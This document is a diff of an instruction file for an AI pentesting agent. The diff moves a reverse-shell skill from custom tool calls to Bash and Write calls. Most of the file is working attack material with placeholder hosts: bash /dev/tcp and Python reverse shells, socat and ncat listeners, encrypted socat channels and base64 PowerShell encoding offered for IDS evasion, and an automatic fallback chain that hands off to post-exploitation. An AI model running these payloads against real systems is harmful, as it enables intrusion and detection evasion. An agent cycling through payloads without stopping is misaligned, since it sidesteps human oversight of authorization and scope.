@@ -20,10 +20,13 @@ You are an expert penetration tester setting up reverse shell infrastructure. Yo
 
 | Tool | Use for |
 |------|---------|
-| `kali(command=...)` | Kali tools: ncat, socat, msfvenom, openssl, base64, python3 |
-| `start_metasploit` | Meterpreter multi/handler listener — `session(action="start_metasploit")` |
-| `run_metasploit` | Meterpreter handler — `scan(tool="metasploit", ...)` |
-| `report(action="note", data={...})` | Write reasoning notes to session log |
+| `Bash("<cmd>")` | Any Kali tool — nmap, naabu, httpx, nuclei, ffuf, katana, subfinder, semgrep, trufflehog, sqlmap, nikto, hydra, gobuster, testssl, enum4linux-ng, theHarvester, dnsrecon, certipy, nxc, impacket, searchsploit, … (everything is on PATH on Kali). Also `curl` for raw HTTP probes. |
+| `Write("pocs/<name>.http", ...)` | Save a confirmed exploit as a raw `.http` file under `pocs/` (paste-ready for Burp Repeater). |
+| `Write("pentest/diagrams/<name>.mmd", ...)` | Save a Mermaid architecture/network diagram. |
+| `Read` + `Write` `pentest/findings.json` | Append a confirmed vulnerability (with evidence) to `pentest/findings.json` — read, mutate the JSON array, write back. |
+| `Read` + `Write` `pentest/coverage.json` | Upsert an endpoint/test cell in the coverage matrix. |
+| `Bash("echo ... >> pentest/notes.log")` | Append a reasoning note or decision to the running session log. |
+| `Bash("tmux new-session ...")` + `tmux send-keys` / `tmux capture-pane` | Drive interactive tools that need a live PTY — msfconsole, evil-winrm, responder, listeners. |
 
 ---
 
@@ -31,14 +34,14 @@ You are an expert penetration tester setting up reverse shell infrastructure. Yo
 
 Read this before generating any payload. Commit to MANDATORY chains before your first tool call.
 
-| Trigger | Chain | Mandatory? | Claude Code | opencode |
-|---------|-------|-----------|-------------|---------|
-| Shell / Meterpreter session obtained | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` | `cat ~/.config/opencode/commands/post-exploit.md` |
+| Trigger | Chain | Mandatory? | Claude Code |
+|------|------|------|------|
+| Shell / Meterpreter session obtained | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` |
 
 **You WILL invoke `/post-exploit` the moment a reverse shell connects. Do not spend time manually enumerating — hand off immediately.**
 
 
-**Logging:** Before invoking any skill above, call `session(action="set_skill", options={"skill":"<name>","reason":"<why>","chained_from":"<this-skill>"})` — this writes the SKILL_CHAIN entry to pentest.log.
+**Logging:** Before invoking any skill above, call `Bash("echo 'SKILL_CHAIN <skill> <reason> chained_from=<this>' >> pentest/skill_chain.log")` — this writes the SKILL_CHAIN entry to pentest.log.
 
 ---
 
@@ -110,7 +113,7 @@ powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.Get
 
 **PowerShell (base64 encoded for evasion):**
 ```
-kali(command="echo 'POWERSHELL_PAYLOAD' | iconv -t UTF-16LE | base64 -w0")
+Bash("echo 'POWERSHELL_PAYLOAD' | iconv -t UTF-16LE | base64 -w0")
 # Then: powershell -enc BASE64_STRING
 ```
 
@@ -204,48 +207,42 @@ echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | xxd -p | tr -d '\n'
 ### Simple ncat listener (single catch)
 
 ```
-kali(command="ncat -lvnp LPORT", timeout=60000)
+Bash("ncat -lvnp LPORT", timeout=60000)
 ```
 
 ### Background listener with output capture
 
 ```
-kali(command="ncat -lvnp LPORT > /tmp/shell-output.txt 2>&1 &")
+Bash("ncat -lvnp LPORT > /tmp/shell-output.txt 2>&1 &")
 # Run exploit...
-kali(command="cat /tmp/shell-output.txt")
+Bash("cat /tmp/shell-output.txt")
 ```
 
 ### Socat listener (auto-TTY)
 
 ```
-kali(command="socat TCP-LISTEN:LPORT,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", timeout=60000)
+Bash("socat TCP-LISTEN:LPORT,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", timeout=60000)
 ```
 
 ### Socat one-shot with timeout
 
 ```
-kali(command="timeout 30 socat TCP-LISTEN:LPORT,reuseaddr STDOUT")
+Bash("timeout 30 socat TCP-LISTEN:LPORT,reuseaddr STDOUT")
 ```
 
 ### Meterpreter multi/handler (best for persistent sessions)
 
 ```
-scan(tool="metasploit", target="TARGET", options={
-  "module": "exploit/multi/handler",
-  "payload": "linux/x64/shell_reverse_tcp",
-  "lhost": "KALI_IP",
-  "lport": "4444",
-  "extra": "set ExitOnSession false"
-})
+Bash("msfconsole TARGET ...")
 ```
 
 ### Encrypted listener (evade IDS)
 
 ```
 # Generate cert
-kali(command="openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 1 -nodes -subj '/CN=localhost'")
+Bash("openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 1 -nodes -subj '/CN=localhost'")
 # Listener
-kali(command="socat OPENSSL-LISTEN:LPORT,cert=/tmp/cert.pem,key=/tmp/key.pem,verify=0,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid")
+Bash("socat OPENSSL-LISTEN:LPORT,cert=/tmp/cert.pem,key=/tmp/key.pem,verify=0,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid")
 # Target payload
 socat OPENSSL:LHOST:LPORT,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
@@ -285,7 +282,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
 
 ### When invoked standalone
 
-1. Call `report(action="note", data={...})` — record target OS, available access, injection point
+1. Call `Bash("echo '<message>' >> pentest/notes.log")` — record target OS, available access, injection point
 2. **Probe available interpreters** on the target (if you have command execution):
    ```
    which bash python3 python perl ruby nc ncat socat lua node php 2>/dev/null
@@ -317,20 +314,20 @@ If a payload fails (no callback), try the next one automatically. **Do NOT stop 
 **How to implement the fallback:**
 ```
 # Set up ONE listener (keep it running)
-kali(command="ncat -lvnp 4444 > /tmp/shell-output.txt 2>&1 &")
+Bash("ncat -lvnp 4444 > /tmp/shell-output.txt 2>&1 &")
 
 # Try bash first
-kali(command="python3 /tmp/exploit.py TARGET 'bash -i >& /dev/tcp/LHOST/4444 0>&1'")
-kali(command="sleep 5 && cat /tmp/shell-output.txt | head -5")  # check for callback
+Bash("python3 /tmp/exploit.py TARGET 'bash -i >& /dev/tcp/LHOST/4444 0>&1'")
+Bash("sleep 5 && cat /tmp/shell-output.txt | head -5")  # check for callback
 
 # No callback? Try python
-kali(command="python3 /tmp/exploit.py TARGET 'python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\\\"LHOST\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")\"'")
-kali(command="sleep 5 && cat /tmp/shell-output.txt | head -5")  # check again
+Bash("python3 /tmp/exploit.py TARGET 'python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\\\"LHOST\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")\"'")
+Bash("sleep 5 && cat /tmp/shell-output.txt | head -5")  # check again
 
 # Continue down the chain...
 ```
 
-Call `report(action="note", data={...})` after each attempt recording which payload was tried and the result.
+Call `Bash("echo '<message>' >> pentest/notes.log")` after each attempt recording which payload was tried and the result.
 
 ### Fallback Chain — Windows
 
@@ -412,6 +409,6 @@ Target OS?
 - **Use encoded payloads** when special characters are filtered (URL params, SQL injection, etc.)
 - **Prefer Meterpreter** when persistence and session management are needed
 - **Stabilize the shell** immediately after catching — unstable shells lose sessions
-- **Document the payload used** — call `report(action="note", data={...})` with the exact command for reproducibility
+- **Document the payload used** — call `Bash("echo '<message>' >> pentest/notes.log")` with the exact command for reproducibility
 - **Use encrypted channels** (socat OPENSSL) when IDS evasion is required
 - **Never leave listeners running** — clean up background listeners when done
